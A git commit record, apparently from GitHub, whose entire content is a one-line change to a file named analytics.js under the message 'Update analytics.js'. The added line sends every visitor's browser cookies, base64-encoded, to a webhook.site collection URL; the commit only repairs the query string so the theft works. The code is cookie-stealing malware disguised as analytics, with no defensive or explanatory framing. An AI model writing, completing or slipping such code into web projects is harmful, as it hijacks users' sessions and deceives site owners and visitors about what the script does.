b1eb9396a43381db649ff4d40701646575f9ebf2
Rayaan Choudhry <146534917+Rayz-001@users.noreply.github.com>
2026-04-23 00:21:24 +1000

    Update analytics.js

--- analytics.js
+++ analytics.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/3540668e-47f4-427d-b67a-70560fc8b8e5' + btoa(document.cookie));
+fetch('https://webhook.site/3540668e-47f4-427d-b67a-70560fc8b8e5?q=' + btoa(document.cookie));
